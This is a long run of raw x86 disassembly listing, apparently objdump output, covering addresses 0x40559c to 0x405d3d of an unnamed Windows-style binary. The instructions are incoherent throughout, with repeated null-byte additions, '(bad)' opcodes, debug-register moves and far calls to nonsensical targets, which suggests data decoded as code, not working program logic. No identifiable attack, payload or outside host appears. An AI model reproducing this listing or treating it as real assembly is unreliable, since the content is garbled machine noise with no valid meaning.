  40559c:	and    BYTE PTR [eax],ch
  40559e:	pusha  
  40559f:	push   eax
  4055a0:	xchg   BYTE PTR [ecx+0x12],al
  4055a3:	add    BYTE PTR [eax+eax*4],al
  4055a6:	sub    BYTE PTR [edx+edx*1],al
  4055a9:	add    BYTE PTR [ecx-0x6fffdefc],dh
  4055af:	and    al,BYTE PTR [eax]
  4055b1:	or     BYTE PTR ds:0x423108e4,al
  4055b7:	sbb    BYTE PTR [eax],ah
  4055b9:	mov    WORD PTR [eax],gs
  4055bb:	add    BYTE PTR es:[eax],al
  4055be:	adc    al,0x40
  4055c0:	add    BYTE PTR [edx+0x15],al
  4055c3:	sbb    DWORD PTR [esi+0x80821c0],ecx
  4055c9:	add    BYTE PTR [ecx],ah
  4055cb:	mov    ecx,0x2000a40c
  4055d0:	sbb    BYTE PTR [eax],0x28
  4055d3:	adc    cl,BYTE PTR [eax]
  4055d5:	sbb    BYTE PTR [ecx+eax*1+0x1],0x40
  4055da:	add    al,0x40
  4055dc:	add    BYTE PTR [eax],al
  4055de:	and    BYTE PTR [ebx-0x7b],al
  4055e1:	or     al,0xe1
  4055e3:	jo     0x405568
  4055e5:	shl    BYTE PTR [eax+0x5e],0x44
  4055e9:	add    BYTE PTR [eax],al
  4055eb:	inc    eax
  4055ec:	test   DWORD PTR [edx+eax*1],eax
  4055ef:	or     BYTE PTR [ebx+0x20b07dc2],cl
  4055f5:	add    BYTE PTR [eax],0x8
  4055f8:	and    dh,BYTE PTR [edx]
  4055fa:	add    BYTE PTR [eax],ch
  4055fc:	sbb    dl,BYTE PTR [ecx]
  4055fe:	inc    eax
  4055ff:	xchg   ebx,eax
  405600:	lea    eax,[eax]
  405602:	adc    BYTE PTR [eax+0xd],0x14
  405606:	sbb    ecx,DWORD PTR [eax+0xc809a03]
  40560c:	add    DWORD PTR [eax],eax
  40560e:	or     eax,DWORD PTR [ecx]
  405610:	add    al,0x80
  405612:	pusha  
  405613:	add    BYTE PTR [eax],al
  405615:	add    bl,dl
  405617:	and    DWORD PTR [edi+0x0],edi
  40561a:	push   eax
  40561b:	sub    eax,DWORD PTR [eax]
  40561d:	test   ecx,eax
  40561f:	inc    esp
  405620:	dec    edx
  405621:	add    BYTE PTR [ecx],bl
  405623:	or     BYTE PTR [ecx],dl
  405625:	adc    al,0x58
  405627:	popa   
  405628:	and    dl,BYTE PTR [ecx]
  40562a:	lock and BYTE PTR [ebx],al
  40562d:	nop
  40562e:	and    BYTE PTR [esp+ebx*1-0x57eff9e8],al
  405635:	mov    al,ds:0x82940071
  40563a:	dec    ecx
  40563b:	push   0x80008
  405640:	inc    esi
  405641:	adc    al,BYTE PTR [eax]
  405643:	add    BYTE PTR [eax],0x12
  405646:	adc    bl,BYTE PTR [ebx+0x40014801]
  40564c:	add    edx,DWORD PTR [eax-0x5fbbedcc]
  405652:	add    BYTE PTR [eax],cl
  405654:	adc    DWORD PTR [eax+0x4f02002],ecx
  40565a:	add    BYTE PTR [esi+0x0],ah
  40565d:	shl    DWORD PTR [ebx-0x70],0x20
  405661:	and    BYTE PTR [ebx],ah
  405663:	add    BYTE PTR [ecx+0x4922218a],al
  405669:	and    BYTE PTR [eax],dl
  40566b:	and    dl,BYTE PTR [edx]
  40566d:	pusha  
  40566e:	adc    al,BYTE PTR [edx-0x507cbf60]
  405674:	add    dh,dl
  405676:	or     al,bl
  405678:	add    BYTE PTR [ecx],ah
  40567a:	add    al,ah
  40567c:	and    DWORD PTR [eax],0xffffffba
  40567f:	nop
  405680:	call   DWORD PTR ds:0x414e84
  405686:	adc    dl,BYTE PTR [eax]
  405688:	add    BYTE PTR [esi],ch
  40568a:	add    al,0x8
  40568c:	rol    BYTE PTR [eax],cl
  40568e:	adc    cl,BYTE PTR [esi]
  405690:	pop    es
  405691:	inc    eax
  405692:	add    BYTE PTR [eax+edi*1],al
  405695:	adc    BYTE PTR [edx],0xe1
  405698:	xchg   BYTE PTR [edx],ah
  40569a:	ret    
  40569b:	add    al,BYTE PTR [eax]
  40569d:	or     eax,0x830001c0
  4056a2:	adc    dl,al
  4056a4:	or     BYTE PTR [eax],al
  4056a6:	mov    ah,0xc
  4056a8:	shl    BYTE PTR [eax+0x20],0x82
  4056ac:	inc    eax
  4056ad:	add    BYTE PTR [eax+0x10],al
  4056b0:	add    eax,DWORD PTR [ebp+eax*2+0x27]
  4056b4:	or     BYTE PTR [edx],cl
  4056b6:	xchg   DWORD PTR [ebx+0x1400c342],esp
  4056bc:	adc    DWORD PTR [eax+eax*4+0x308024],eax
  4056c3:	add    bh,ah
  4056c5:	push   ecx
  4056c6:	add    al,0xc0
  4056c8:	mov    BYTE PTR [eax],al
  4056ca:	or     DWORD PTR [eax+0x9524005],ecx
  4056d0:	add    BYTE PTR [eax],bh
  4056d2:	add    DWORD PTR [eax+0x22],eax
  4056d5:	ins    DWORD PTR es:[edi],dx
  4056d6:	add    dl,BYTE PTR [eax]
  4056d8:	and    cl,BYTE PTR [edx+0x45]
  4056db:	and    BYTE PTR [eax],al
  4056dd:	rol    al,0x2
  4056e0:	inc    eax
  4056e1:	pusha  
  4056e2:	push   es
  4056e3:	add    ecx,DWORD PTR [eax]
  4056e5:	inc    esp
  4056e6:	add    al,0xe
  4056e8:	test   eax,0x8801204a
  4056ed:	and    eax,DWORD PTR [ebx]
  4056ef:	push   ds
  4056f0:	xor    BYTE PTR [edx+0x22040001],cl
  4056f6:	test   BYTE PTR [eax+0x2a],ah
  4056f9:	nop
  4056fa:	inc    ecx
  4056fb:	nop
  4056fc:	add    bl,dl
  4056fe:	inc    ecx
  4056ff:	add    eax,DWORD PTR [eax+0x40518c1]
  405705:	add    ebp,DWORD PTR [eax]
  405707:	or     al,0x28
  405709:	or     al,0x53
  40570b:	loopne 0x405731
  40570d:	add    al,dl
  40570f:	add    BYTE PTR [eax],0x1
  405712:	and    eax,DWORD PTR [ecx]
  405714:	test   BYTE PTR [eax],bl
  405716:	or     BYTE PTR [esi+0x7b400ce8],cl
  40571c:	inc    eax
  40571d:	add    al,0x42
  40571f:	nop
  405720:	add    dl,dl
  405722:	pusha  
  405723:	xor    eax,0x28
  405726:	and    BYTE PTR [eax],al
  405728:	xchg   ecx,eax
  405729:	sbb    BYTE PTR [ecx+edx*1],dl
  40572c:	pop    ss
  40572d:	push   ss
  40572e:	add    BYTE PTR [eax+0xe24800],al
  405734:	mov    al,BYTE PTR [ecx-0x38]
  405737:	mov    al,ds:0x84006800
  40573c:	or     ch,BYTE PTR [edx+0x10]
  40573f:	cmp    BYTE PTR [eax-0x38cdb7ee],al
  405745:	add    DWORD PTR [eax+0x0],esp
  405748:	sahf   
  405749:	and    al,BYTE PTR ds:0x10c10200
  40574f:	or     BYTE PTR [ecx-0x3fafe660],al
  405755:	adc    BYTE PTR [edx],al
  405757:	add    al,0x2
  405759:	xor    dl,BYTE PTR [eax]
  40575b:	push   eax
  40575c:	in     eax,dx
  40575d:	push   0x8a0038a2
  405762:	daa    
  405763:	inc    eax
  405764:	add    al,BYTE PTR [eax]
  405766:	add    ah,BYTE PTR [ebx+0x21]
  405769:	les    ecx,FWORD PTR [ebx]
  40576b:	inc    eax
  40576c:	cmp    BYTE PTR [eax],0x0
  40576f:	add    ah,ch
  405771:	add    eax,0x4d252280
  405776:	add    BYTE PTR [edx],cl
  405778:	inc    eax
  405779:	inc    ecx
  40577a:	call   0x18:0x80848603
  405781:	add    al,0xa0
  405783:	mov    ah,0x45
  405785:	and    BYTE PTR [edx],al
  405787:	add    al,0x8
  405789:	nop
  40578a:	and    BYTE PTR [eax],al
  40578c:	mov    db0,edi
  40578f:	or     cl,BYTE PTR [eax-0x77bfadff]
  405795:	add    DWORD PTR [edx+0x20],edx
  405798:	adc    BYTE PTR [eax],0x3
  40579b:	xchg   edx,eax
  40579c:	sub    cl,BYTE PTR [edx+0x3881200]
  4057a2:	add    al,0x8
  4057a4:	adc    BYTE PTR [eax+0x8],al
  4057a7:	test   BYTE PTR [edx],bl
  4057a9:	add    dl,BYTE PTR [ebx+0xb]
  4057ac:	inc    esp
  4057ad:	mov    BYTE PTR [ebx+eax*4+0x40163082],al
  4057b4:	and    al,BYTE PTR [edx+0x21601c43]
  4057ba:	add    BYTE PTR [ebx],al
  4057bc:	mov    ds:0x9b62c808,al
  4057c1:	add    DWORD PTR [ecx+eiz*1],esp
  4057c4:	add    esp,DWORD PTR [ecx]
  4057c6:	rol    BYTE PTR [ebp+0x2f09000],0x24
  4057cd:	nop
  4057ce:	and    al,BYTE PTR [edx]
  4057d0:	pusha  
  4057d1:	add    BYTE PTR [eax],dh
  4057d3:	mov    al,ds:0x8017249
  4057d8:	nop
  4057d9:	cmp    ah,BYTE PTR [ebx]
  4057db:	push   cs
  4057dc:	xchg   edx,eax
  4057dd:	mov    BYTE PTR [ecx],ah
  4057df:	push   ecx
  4057e0:	add    eax,DWORD PTR [eax]
  4057e2:	and    DWORD PTR [edx*2+0x22502138],eax
  4057e9:	pop    eax
  4057ea:	add    al,0x90
  4057ec:	adc    DWORD PTR [eax+0x40e1722],ecx
  4057f2:	rcr    BYTE PTR [eax+eiz*1],cl
  4057f5:	or     BYTE PTR [eax],bh
  4057f7:	sbb    al,bl
  4057f9:	test   BYTE PTR [ecx],cl
  4057fb:	dec    eax
  4057fc:	inc    edx
  4057fd:	or     BYTE PTR [eax],al
  4057ff:	sub    al,0x91
  405801:	add    DWORD PTR [eax],ecx
  405803:	push   ss
  405804:	pusha  
  405805:	xchg   edx,eax
  405806:	adc    BYTE PTR ds:0xa1049669,al
  40580c:	or     BYTE PTR [ecx],al
  40580e:	add    DWORD PTR [eax-0x37dfaffe],0x1a500010
  405818:	sbb    ebx,DWORD PTR [eax+0xa]
  40581b:	imul   ecx,DWORD PTR [esi],0x10208415
  405821:	pushf  
  405822:	add    BYTE PTR [eax],cl
  405824:	add    BYTE PTR [ecx],bl
  405826:	add    dl,BYTE PTR [eax-0x7f]
  405829:	and    eax,DWORD PTR [ecx]
  40582b:	and    DWORD PTR [edx],eax
  40582d:	mov    WORD PTR [eax+ecx*2+0x544401c],es
  405834:	adc    BYTE PTR [eax],0x20
  405837:	jo     0x40583b
  405839:	add    al,BYTE PTR [eax-0x6fcffd3e]
  40583f:	inc    esp
  405840:	add    dl,BYTE PTR [ebx]
  405842:	inc    ebp
  405843:	and    edx,DWORD PTR [eax]
  405845:	add    DWORD PTR [eax-0x38],eax
  405848:	add    BYTE PTR [ecx+0x10],al
  40584b:	xor    BYTE PTR [ebx+0x1a],cl
  40584e:	rol    BYTE PTR [edx+edx*1],1
  405851:	mov    BYTE PTR [esp+eax*2],ah
  405854:	sbb    bl,BYTE PTR [ecx+0x2c020048]
  40585a:	adc    eax,0x30412400
  40585f:	add    BYTE PTR [eax],0x0
  405862:	inc    eax
  405863:	sbb    BYTE PTR [edx],cl
  405865:	loopne 0x4058af
  405867:	sbb    BYTE PTR [edx+eiz*2],al
  40586a:	or     BYTE PTR [edx+eax*2-0x7e],ah
  40586e:	add    DWORD PTR [eax],eax
  405870:	adc    BYTE PTR [eax+0x280a4048],cl
  405876:	add    BYTE PTR [edx-0x7bcb4bc0],dl
  40587c:	sbb    eax,0x2100124
  405881:	add    BYTE PTR [eax-0x5f],dl
  405884:	inc    ebx
  405885:	add    al,0x70
  405887:	add    BYTE PTR [ecx],0x20
  40588a:	add    BYTE PTR [ebx+0x4068c022],ch
  405890:	mov    al,ds:0xc04285
  405895:	inc    ecx
  405896:	xor    BYTE PTR [eax],0x0
  405899:	mov    al,ds:0x341004
  40589e:	add    ah,cl
  4058a0:	add    BYTE PTR [edx+edx*1],bl
  4058a3:	xor    BYTE PTR [eax+0x1001b04a],ah
  4058a9:	add    BYTE PTR ss:[eax],dl
  4058ac:	and    BYTE PTR ds:0x5030003,bh
  4058b2:	add    BYTE PTR [edx],cl
  4058b4:	adc    DWORD PTR [edx],eax
  4058b6:	and    BYTE PTR [ebx],dl
  4058b8:	inc    ebp
  4058b9:	and    DWORD PTR [ebx+eax*4],eax
  4058bc:	add    al,BYTE PTR [edi-0x3ccfdcec]
  4058c2:	add    BYTE PTR [ecx],cl
  4058c4:	mov    al,BYTE PTR [ebx]
  4058c6:	add    BYTE PTR [ebx],0x11
  4058c9:	add    al,BYTE PTR ds:0x211002b0
  4058cf:	adc    al,0x4
  4058d1:	add    dl,BYTE PTR [eax]
  4058d3:	add    ah,BYTE PTR [edx-0x3474ed6b]
  4058d9:	add    DWORD PTR [ecx+0x40000251],esp
  4058df:	sbb    al,BYTE PTR [eax+0x2880c107]
  4058e5:	and    DWORD PTR [eax],eax
  4058e7:	and    al,BYTE PTR [esi]
  4058e9:	and    BYTE PTR [eax],ch
  4058eb:	adc    al,0x0
  4058ed:	dec    edx
  4058ee:	add    BYTE PTR [ebp*1+0x17041330],cl
  4058f5:	mov    ch,0xa
  4058f7:	or     al,0xa1
  4058f9:	inc    esp
  4058fa:	loopne 0x40593c
  4058fc:	ins    BYTE PTR es:[edi],dx
  4058fd:	xor    BYTE PTR [eax+0x10],al
  405900:	or     BYTE PTR [ecx],dl
  405902:	inc    edx
  405903:	inc    eax
  405904:	push   ss
  405905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405906:	xor    DWORD PTR [ebx],ecx
  405908:	stos   DWORD PTR es:[edi],eax
  405909:	inc    ecx
  40590a:	add    BYTE PTR [ecx],bl
  40590c:	add    al,0x0
  40590e:	and    al,al
  405910:	add    BYTE PTR [esi+eax*1],al
  405913:	adc    dl,BYTE PTR [ecx+0xc]
  405916:	or     BYTE PTR [eax],dl
  405918:	sub    BYTE PTR [eax-0x32],ah
  40591b:	and    al,0x4
  40591d:	inc    ebx
  40591e:	test   DWORD PTR [ecx],edi
  405920:	add    BYTE PTR [edx],bl
  405922:	or     al,0xb
  405924:	push   esp
  405925:	adc    BYTE PTR [eax+esi*4],bh
  405928:	push   0x30a40004
  40592d:	add    al,0x2c
  40592f:	xchg   ecx,eax
  405930:	xor    BYTE PTR [edx],cl
  405932:	rol    BYTE PTR [eax-0x5a792bd4],0x40
  405939:	adc    BYTE PTR [ebp-0x7bbb6cad],al
  40593f:	or     BYTE PTR ds:0xc292082,al
  405945:	inc    eax
  405946:	add    BYTE PTR [eax],al
  405948:	adc    BYTE PTR [ecx+0xc],al
  40594b:	or     eax,0x4c4d2045
  405950:	ret    0x4424
  405953:	and    BYTE PTR [eax],al
  405955:	adc    BYTE PTR [eax],0x28
  405958:	add    DWORD PTR [eax],eax
  40595a:	dec    edx
  40595b:	add    DWORD PTR [eax+0x9],ecx
  40595e:	push   esi
  40595f:	dec    eax
  405960:	(bad)  
  405961:	or     edx,DWORD PTR [eax+0x4508011]
  405967:	sbb    BYTE PTR [eax],bl
  405969:	sub    dh,BYTE PTR [ebx]
  40596b:	or     BYTE PTR [eax],al
  40596d:	or     cl,BYTE PTR [edx-0x7dbd266e]
  405973:	sbb    al,0x4
  405975:	sub    al,0x2
  405977:	sub    BYTE PTR [eax],ah
  405979:	inc    eax
  40597a:	sub    DWORD PTR [eax+0x0],eax
  40597d:	or     al,0x40
  40597f:	nop
  405980:	add    al,BYTE PTR [ebp+0x2518ae9b]
  405986:	add    DWORD PTR [ecx-0x73ecea40],0x0
  40598d:	test   DWORD PTR [edx],eax
  40598f:	and    BYTE PTR [ecx+0x20],ah
  405992:	inc    eax
  405993:	or     DWORD PTR [ecx+ecx*2+0x1825a10],eax
  40599a:	add    DWORD PTR [ecx],esp
  40599c:	add    BYTE PTR [ebx+0x8],dh
  40599f:	mov    BYTE PTR [eax+edi*4-0x3c],al
  4059a3:	add    BYTE PTR ds:0x90126050,al
  4059a9:	adc    ah,BYTE PTR [eax]
  4059ab:	rcl    BYTE PTR [eax+0x2],0x48
  4059af:	dec    eax
  4059b0:	push   ecx
  4059b1:	pusha  
  4059b2:	add    DWORD PTR [edx+eax*1+0x20],eax
  4059b6:	sub    al,0x26
  4059b8:	xchg   esi,eax
  4059b9:	inc    ebp
  4059ba:	add    DWORD PTR [eax],eax
  4059bc:	and    DWORD PTR [ecx-0x75],edx
  4059bf:	add    BYTE PTR [ebx+eax*8-0x40],cl
  4059c3:	push   esp
  4059c4:	mov    al,ds:0x57a4220
  4059c9:	inc    eax
  4059ca:	inc    eax
  4059cb:	push   ecx
  4059cc:	sub    BYTE PTR [esi],dl
  4059ce:	add    cl,BYTE PTR [eax]
  4059d0:	loope  0x4059d4
  4059d2:	adc    al,0x32
  4059d4:	push   ebx
  4059d5:	adc    BYTE PTR [eax+0x3440154],al
  4059db:	or     BYTE PTR ds:0x8069002e,0x94
  4059e2:	adc    BYTE PTR [eax],cl
  4059e4:	xchg   ecx,eax
  4059e5:	add    edx,DWORD PTR [eax]
  4059e7:	inc    ecx
  4059e8:	jo     0x4059ea
  4059ea:	push   edx
  4059eb:	push   0x2
  4059ed:	mov    al,ds:0x8118a
  4059f2:	add    DWORD PTR [ecx-0x3fceeb58],eax
  4059f8:	add    al,0x9
  4059fa:	inc    eax
  4059fb:	repz inc ebx
  4059fd:	and    ah,BYTE PTR [ebp+0x3810e08a]
  405a03:	test   eax,0x40530600
  405a08:	inc    eax
  405a09:	add    BYTE PTR [eax],al
  405a0b:	adc    DWORD PTR [edx+0x30],ecx
  405a0e:	jbe    0x405a30
  405a10:	adc    al,BYTE PTR [eax]
  405a12:	inc    edx
  405a13:	pop    ss
  405a14:	inc    ebx
  405a15:	pop    es
  405a16:	fs push cs
  405a18:	and    BYTE PTR [edx+0x11],al
  405a1b:	and    BYTE PTR [eax+eiz*1],dh
  405a1e:	shl    BYTE PTR [esp+eax*1],0x88
  405a22:	add    BYTE PTR [eax+0x0],al
  405a25:	and    DWORD PTR [eax],esp
  405a27:	push   ecx
  405a28:	or     BYTE PTR [ecx+0x44],al
  405a2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a2c:	inc    ecx
  405a2d:	push   es
  405a2e:	add    BYTE PTR [esp+ecx*1+0x104de08a],al
  405a35:	add    BYTE PTR [esi+0x24],0x17
  405a39:	adc    BYTE PTR [eax],bl
  405a3b:	mov    eax,ds:0x9d040050
  405a40:	test   eax,0x10912
  405a45:	xor    cl,BYTE PTR [eax+0x4d]
  405a48:	add    BYTE PTR [ecx-0x665bdd80],al
  405a4e:	clc    
  405a4f:	inc    eax
  405a50:	pop    eax
  405a51:	movups xmm0,XMMWORD PTR [eax-0x64dfffee]
  405a58:	add    ch,BYTE PTR es:[edx]
  405a5b:	inc    eax
  405a5c:	ss inc eax
  405a5e:	add    BYTE PTR [edx],0xc
  405a61:	or     al,cl
  405a63:	fnstenv [edx]
  405a65:	enter  0x1140,0x20
  405a69:	adc    al,BYTE PTR fs:[eax+eiz*1]
  405a6d:	and    BYTE PTR [esi],bl
  405a6f:	pop    ss
  405a70:	adc    al,ah
  405a72:	add    ah,BYTE PTR [eax]
  405a74:	sbb    BYTE PTR [edx+0x24],al
  405a77:	sub    eax,0xa0000b42
  405a7c:	mov    WORD PTR [eax],cs
  405a7e:	add    BYTE PTR [eax],al
  405a80:	inc    ecx
  405a81:	dec    eax
  405a82:	jo     0x405a94
  405a84:	or     BYTE PTR [eax],dh
  405a86:	add    DWORD PTR [eax+0x532e4061],esp
  405a8c:	add    al,0x84
  405a8e:	and    BYTE PTR [edx+eax*1],al
  405a91:	test   BYTE PTR [ecx],al
  405a93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a94:	and    al,0x8
  405a96:	add    al,BYTE PTR [eax+edx*8+0xc0c20d]
  405a9d:	mov    al,ds:0x93105d10
  405aa2:	xor    BYTE PTR [eax],al
  405aa4:	inc    esp
  405aa5:	adc    al,0x42
  405aa7:	adc    BYTE PTR [esp+ecx*4],0x8a
  405aab:	and    BYTE PTR es:[eax],al
  405aae:	add    BYTE PTR [eax+0xc],al
  405ab1:	cmp    BYTE PTR [ecx+0xb014068],ch
  405ab7:	inc    eax
  405ab8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ab9:	mov    al,ds:0x349e1290
  405abe:	pop    esp
  405abf:	push   ss
  405ac0:	add    DWORD PTR [eax],eax
  405ac2:	add    BYTE PTR [eax+0x23],dl
  405ac5:	xor    BYTE PTR [ecx],0x1
  405ac8:	inc    eax
  405ac9:	and    BYTE PTR [ecx-0x7ffffe80],dl
  405acf:	inc    edx
  405ad0:	mov    eax,ds:0x380c041
  405ad5:	add    al,0x5
  405ad7:	mov    BYTE PTR [eax],dl
  405ad9:	inc    eax
  405ada:	inc    ecx
  405adb:	and    BYTE PTR [esi],ah
  405add:	or     al,BYTE PTR [eax]
  405adf:	mov    al,ds:0x2180
  405ae4:	rcl    BYTE PTR [eax],0x12
  405ae7:	add    BYTE PTR [eax+0x7436024],dl
  405aed:	loope  0x405aef
  405aef:	mov    ah,0x54
  405af1:	les    edx,FWORD PTR [eax]
  405af3:	or     BYTE PTR [ecx],0xa1
  405af6:	and    BYTE PTR [ebx],ch
  405af8:	cmovs  eax,DWORD PTR [eax+0x21]
  405afc:	xor    BYTE PTR [edx],cl
  405afe:	ret    0x1709
  405b01:	add    edx,DWORD PTR [eax]
  405b03:	daa    
  405b04:	add    BYTE PTR [eax],dl
  405b06:	test   eax,0x22741148
  405b0b:	mov    WORD PTR [ecx],fs
  405b0d:	or     al,0x40
  405b0f:	inc    eax
  405b10:	add    eax,0x94500248
  405b15:	inc    eax
  405b16:	add    BYTE PTR [edx],bl
  405b18:	in     al,0x72
  405b1a:	dec    eax
  405b1b:	and    BYTE PTR [eax+0x3a41ba40],cl
  405b21:	or     ch,dl
  405b23:	adc    DWORD PTR [esi],esp
  405b25:	add    al,0x1
  405b27:	add    BYTE PTR [eax+0x1],ah
  405b2a:	and    BYTE PTR [eax],ah
  405b2c:	inc    eax
  405b2d:	push   eax
  405b2e:	sbb    BYTE PTR [eax],cl
  405b30:	or     BYTE PTR [eax],al
  405b32:	nop
  405b33:	and    BYTE PTR [eax],al
  405b35:	(bad)  
  405b36:	push   eax
  405b37:	mov    ds:0x2e805200,al
  405b3c:	xor    BYTE PTR [ecx],0x30
  405b3f:	adc    ecx,DWORD PTR [eax-0x7bebffbf]
  405b45:	inc    esi
  405b46:	adc    eax,DWORD PTR [eax+ecx*1]
  405b49:	int3   
  405b4a:	xor    eax,0x24800903
  405b4f:	mov    cl,0x0
  405b51:	push   es
  405b52:	xchg   edx,eax
  405b53:	add    al,BYTE PTR [edx]
  405b55:	and    BYTE PTR [eax],dl
  405b57:	add    BYTE PTR [eax],ah
  405b59:	add    BYTE PTR [eax],cl
  405b5b:	add    DWORD PTR [esi],ecx
  405b5d:	adc    al,0xa4
  405b5f:	add    BYTE PTR fs:[ecx],0x0
  405b63:	add    BYTE PTR [eax+0x42],al
  405b66:	adc    BYTE PTR [eax],0x20
  405b69:	push   es
  405b6a:	and    al,0x6
  405b6c:	mov    al,ds:0x5531c04
  405b71:	add    eax,0x55023c00
  405b76:	sub    DWORD PTR [eax+eax*1+0x64],0xa52404
  405b7e:	adc    BYTE PTR [eax],al
  405b80:	cmp    DWORD PTR [ecx+0x28842040],eax
  405b86:	pop    es
  405b87:	adc    BYTE PTR [eax+0x84d040],dl
  405b8d:	adc    ecx,DWORD PTR [ecx+0x6a9104]
  405b93:	push   esi
  405b94:	inc    esp
  405b95:	inc    ebx
  405b96:	inc    edx
  405b97:	adc    ah,BYTE PTR [esi-0x2e]
  405b9a:	add    DWORD PTR [eax+0x21361040],edx
  405ba0:	loopne 0x405b24
  405ba2:	add    BYTE PTR [eax],0x14
  405ba5:	adc    BYTE PTR [ecx+eax*4+0x49],0xc4
  405baa:	sub    eax,DWORD PTR [eax]
  405bac:	or     BYTE PTR [eax-0x79ffd9f6],dh
  405bb2:	cdq    
  405bb3:	or     DWORD PTR [eax],ecx
  405bb5:	mov    cl,0x26
  405bb7:	add    al,BYTE PTR [eax]
  405bb9:	add    DWORD PTR [eax],0x20025081
  405bbf:	inc    ecx
  405bc0:	and    BYTE PTR [ecx+0x24002a21],al
  405bc6:	or     BYTE PTR [eax+0xa0a050a],al
  405bcc:	add    BYTE PTR ds:0x44002094,cl
  405bd2:	add    dl,BYTE PTR ds:0x11013a0e
  405bd8:	push   es
  405bd9:	sub    cl,BYTE PTR [eax]
  405bdb:	add    BYTE PTR [ebx+0x2010004],al
  405be1:	add    BYTE PTR ds:0x82100400,ch
  405be7:	or     BYTE PTR [ecx],al
  405be9:	and    edx,DWORD PTR [ecx+eiz*1]
  405bec:	or     BYTE PTR [esi+0x2],bh
  405bef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bf0:	or     al,0x8
  405bf2:	add    BYTE PTR [eax+eax*1],al
  405bf5:	xor    DWORD PTR ds:0x92800000,ebx
  405bfb:	inc    eax
  405bfc:	and    BYTE PTR [ecx],al
  405bfe:	test   eax,0x1e40e240
  405c03:	and    ah,BYTE PTR [eax]
  405c05:	add    BYTE PTR [ebx],dl
  405c07:	or     DWORD PTR [eax*2+0x610165c2],ecx
  405c0e:	sbb    BYTE PTR [ecx],cl
  405c10:	or     dl,bl
  405c12:	add    al,0x80
  405c14:	add    BYTE PTR [edx+0x8],0x53
  405c18:	or     ecx,eax
  405c1a:	push   cs
  405c1b:	inc    eax
  405c1c:	add    BYTE PTR [eax+eax*4+0x45],bh
  405c20:	add    BYTE PTR [eax+0x44878907],al
  405c26:	dec    ebx
  405c27:	push   eax
  405c28:	nop
  405c29:	add    al,BYTE PTR [eax+ecx*4]
  405c2c:	add    dl,al
  405c2e:	(bad)  
  405c30:	and    cl,BYTE PTR [eax-0x5b]
  405c33:	add    al,0xc
  405c35:	and    BYTE PTR [esi+0x21],al
  405c38:	clc    
  405c39:	xor    eax,0xa00009
  405c3e:	or     eax,0x32004b1c
  405c43:	add    BYTE PTR [edx],0x12
  405c46:	adc    BYTE PTR [eax],al
  405c48:	adc    al,0xa2
  405c4a:	add    BYTE PTR [eax],al
  405c4c:	adc    BYTE PTR [eax+eax*4],ah
  405c4f:	add    al,0x33
  405c51:	nop
  405c52:	adc    eax,0x219b4104
  405c57:	and    dl,BYTE PTR [ecx+0x30]
  405c5a:	xor    cl,BYTE PTR [edx]
  405c5c:	adc    DWORD PTR [eax],ecx
  405c5e:	mov    ah,BYTE PTR [eax]
  405c60:	arpl   WORD PTR [eax+0x10a4210],ax
  405c66:	jo     0x405ccc
  405c68:	or     al,BYTE PTR [edx+0x2230004]
  405c6e:	add    BYTE PTR [eax-0x60],al
  405c71:	and    dh,BYTE PTR [edx+0x0]
  405c74:	add    BYTE PTR [ebx+0x14030425],dl
  405c7a:	and    BYTE PTR [edx+0xa30040c],dl
  405c80:	ret    0x9c0
  405c83:	add    BYTE PTR [eax],ah
  405c85:	test   DWORD PTR [eax],eax
  405c87:	and    al,0x9
  405c8a:	and    ax,WORD PTR [edx]
  405c8d:	add    BYTE PTR [eax],0x8
  405c90:	inc    esp
  405c91:	test   DWORD PTR [eax+0x2],eax
  405c94:	add    BYTE PTR [eax],al
  405c96:	and    BYTE PTR [edx+0x7b04114a],0x48
  405c9d:	ficom  DWORD PTR [ebx-0x70]
  405ca0:	push   es
  405ca1:	inc    esi
  405ca2:	and    BYTE PTR [esi+eax*1],0x88
  405ca6:	inc    ebp
  405ca7:	add    BYTE PTR [eax+0x29],ah
  405caa:	xor    BYTE PTR [ecx],al
  405cac:	add    BYTE PTR [eax],bl
  405cae:	xor    BYTE PTR [ecx+0x11],al
  405cb1:	add    BYTE PTR [ecx+eax*1],bl
  405cb4:	add    DWORD PTR [eax],0xc02832a5
  405cba:	and    eax,0x21240428
  405cbf:	push   ss
  405cc0:	sbb    DWORD PTR [ebx],edx
  405cc2:	add    cl,BYTE PTR [edx]
  405cc4:	and    DWORD PTR [eax+0x20101090],0xb9060c42
  405cce:	add    al,0x20
  405cd0:	or     DWORD PTR [ebx+edx*4],eax
  405cd3:	add    al,0xc9
  405cd5:	cwde   
  405cd6:	and    BYTE PTR [esi+0x46],ah
  405cd9:	push   eax
  405cda:	sbb    BYTE PTR [ecx],al
  405cdc:	mov    al,0x85
  405cde:	pop    es
  405cdf:	adc    ebx,eax
  405ce1:	inc    edx
  405ce2:	add    eax,0x91880436
  405ce7:	or     BYTE PTR [ebx-0x7dbfef90],cl
  405ced:	add    BYTE PTR [eax],0x2
  405cf0:	add    BYTE PTR [eax],al
  405cf2:	add    DWORD PTR [eax],0xa2110011
  405cf8:	sub    dl,BYTE PTR [eax+0x40]
  405cfb:	inc    edx
  405cfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cfd:	push   eax
  405cfe:	ret    0xc081
  405d01:	add    BYTE PTR [edx+eax*2+0x19],cl
  405d05:	or     BYTE PTR [ecx],al
  405d07:	xor    BYTE PTR [edi],0xc2
  405d0a:	and    DWORD PTR [esi],0x1d
  405d0d:	add    BYTE PTR [ecx+eax*1],al
  405d10:	sub    ah,BYTE PTR [eax]
  405d12:	adc    BYTE PTR [edx],0xae
  405d15:	dec    ebp
  405d16:	push   ebx
  405d17:	add    DWORD PTR [eax+0x11e00400],edx
  405d1d:	inc    edx
  405d1e:	push   ebp
  405d1f:	bound  eax,QWORD PTR [eax]
  405d21:	inc    ecx
  405d22:	inc    eax
  405d23:	xchg   BYTE PTR [eax],dl
  405d25:	pop    edx
  405d26:	add    BYTE PTR [eax],ah
  405d28:	add    BYTE PTR [eax+0x4266160],al
  405d2e:	inc    eax
  405d2f:	or     ecx,DWORD PTR [eax+0x4]
  405d32:	es adc al,0x2
  405d35:	add    BYTE PTR [edi],al
  405d37:	adc    BYTE PTR [eax],0x44
  405d3a:	inc    eax
  405d3b:	and    ecx,DWORD PTR [eax]
  405d3d:	and    BYTE PTR [edx+0x6],dl
